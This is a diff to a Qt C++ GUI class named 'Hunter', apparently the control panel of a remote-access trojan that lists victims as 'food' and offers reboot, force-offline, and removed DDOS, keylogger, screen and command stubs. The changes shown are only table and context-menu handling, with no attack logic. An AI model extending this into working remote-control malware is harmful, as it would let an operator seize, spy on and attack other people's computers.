@@ -50,21 +50,22 @@ Hunter::Hunter(QWidget *parent)
     ui->tableOnline->setHorizontalHeaderItem(4, new QTableWidgetItem("系统信息"));
     // 自适应列宽
     ui->tableOnline->horizontalHeader()->setSectionResizeMode(QHeaderView::Stretch);
+    // 隐藏水平表头
+    ui->tableOnline->verticalHeader()->setHidden(true);
     // 一行一行地选中
     ui->tableOnline->setSelectionBehavior(QAbstractItemView::SelectRows);
     // 一次最多选中一行
     ui->tableOnline->setSelectionMode(QAbstractItemView::SingleSelection);
     // 设置不可更改
     ui->tableOnline->setEditTriggers(QAbstractItemView::NoEditTriggers);
+    ui->tableOnline->setContextMenuPolicy(Qt::CustomContextMenu);
 
     // 右键出现的每一项的菜单 连接对应逻辑
-    m_Rclick = new QMenu(this);
+    m_Rclick = new QMenu(ui->tableOnline);
     QAction *actSendBox = m_Rclick->addAction("发送弹窗");
     QAction *actReboot = m_Rclick->addAction("重启电脑");
     QAction *actOffline = m_Rclick->addAction("强制下线");
-    connect(actSendBox, &QAction::triggered, &Hunter::sendBoxClicked);
-    connect(actReboot, &QAction::triggered, &Hunter::rebootClicked);
-    connect(actOffline, &QAction::triggered, &Hunter::OfflineClicked);
+
     // 将菜单添加至鼠标事件中 再拦截鼠标事件得以处理
     m_Rclick->installEventFilter(this);
 
@@ -82,41 +83,6 @@ Hunter::~Hunter()
 
 
 // ------------------------------------几个功能按键逻辑----------------------------------------
-void Hunter::btFileClicked(){
-
-}
-
-void Hunter::btCmdClicked(){
-
-}
-
-void Hunter::btDDOSClicked(){
-
-}
-
-void Hunter::btScreenClicked(){
-
-}
-
-void Hunter::btProcessClicked(){
-
-}
-
-void Hunter::btKeybdClicked(){
-
-}
-
-void Hunter::sendBoxClicked(){
-
-}
-
-void Hunter::OfflineClicked(){
-
-}
-
-void Hunter::rebootClicked(){
-
-}
 
 // 添加食物列表
 void Hunter::addFoodToTbl(int id, QString username, QString ipaddr, int port, QString sysInfo){
@@ -145,11 +111,24 @@ void Hunter::addFoodToTbl(int id, QString username, QString ipaddr, int port, QS
 // 删除食物
 void Hunter::rmFoodFromTbl(int id){
 
+    // 用ID判断该删除的行索引
+    int count = ui->tableOnline->rowCount();
+    for (int i = 0; i< count; i++) {
+        if (ui->tableOnline->item(i, 0)->text().toInt() == id) {
+            // 删除
+            ui->tableOnline->removeRow(i);
+            break;
+        }
+    }
 }
 
 // 返回当前选中食物ID
 int Hunter::curFoodIdInTbl(){
-
+    int index = ui->tableOnline->currentRow();
+    if (index == -1) {
+        return -1;
+    }
+    return ui->tableOnline->item(index, 0)->text().toInt();
 }
 
 // 开启服务器监听
@@ -159,5 +138,12 @@ void Hunter::startLstn(){
 
 // 重写事件过滤函数
 bool Hunter::eventFilter(QObject *watched, QEvent *event){
+    // 右键弹出菜单
+    if (watched == (QObject*)ui->tableOnline) {
+        if (event->type() == QEvent::ContextMenu) {
+           m_Rclick->exec(QCursor::pos());
+        }
+    }
 
+    return QObject::eventFilter(watched, event);
 }
